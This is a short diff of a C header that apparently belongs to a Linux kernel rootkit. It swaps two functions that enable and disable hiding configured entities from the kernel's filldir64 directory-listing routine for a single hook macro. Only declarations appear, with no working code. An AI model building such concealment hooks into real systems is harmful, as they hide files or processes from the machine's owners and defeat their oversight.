@@ -1,8 +1,6 @@
 #pragma once
 
-/// @brief Enable the hiding of configured entities from `filldir64`
-void hide_set_filldir64(void);
+#include <hook.h>
 
-/// @brief Disable hiding of configured entities from `filldir64`
-void hide_unset_filldir64(void);
-
+/// @brief Enable/disable the hiding of configured entities from `filldir64`
+HOOK_EXTERN(hide, filldir64)
